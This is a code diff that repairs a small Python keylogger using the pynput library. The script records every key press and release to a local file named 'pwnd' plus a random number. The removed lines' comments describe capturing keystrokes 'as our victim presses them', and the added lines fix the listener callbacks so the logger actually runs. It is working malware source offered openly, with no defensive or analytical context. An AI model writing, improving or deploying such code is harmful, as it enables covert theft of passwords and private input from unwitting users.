@@ -1,22 +1,24 @@
-import random                                                                    #import random module which helps generate a random integer#
+import random
+from random import randint
 from pynput.keyboard import Key, Listener, Controller
 
-output = 'pwnd' + str(random.randint(69, 75)) + '.txt'                         #output = filename plus a random integer within the specific range as a text file#
+output = 'pwnd' + str(random.randint(312, 33345345453453453455344534533453453453453453455)) + '.txt'
 
-with open(output, 'w') as f:                                                     #opens the output file with write permissions, set key to an empty variable (letters added later)#
-    Key = ''
+with open(output, 'w') as f:
+    f.close()
 
-    def keystroke(key):                                                           #this function records the key strokes as our victim presses them#
-        with open(output, 'a') as f:
-            f.write('{0} pressed\n'.format(key))                                 #this writes the pressed key to the file#
-            f.close()
-
-    def keyrelease(key):                                                        #this function records the key strokes as our victim releases on the keyboard#
-        with open(output, 'a') as f:
-                f.write('{0} released\n'.format(key))                           #this writes the released key to the file#
-                f.close()
+def on_press(key):
+    with open(output, 'a') as f:
+        f.write('{0} pressed\n'.format(key))
+        f.close()
 
 
-with Listener(keystroke=keystroke, keyrelease=keyrelease) as listener:
+def on_release(key):
+    with open(output, 'a') as f:
+        f.write('{0} released\n'.format(key))
+        f.close()
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
     exit()
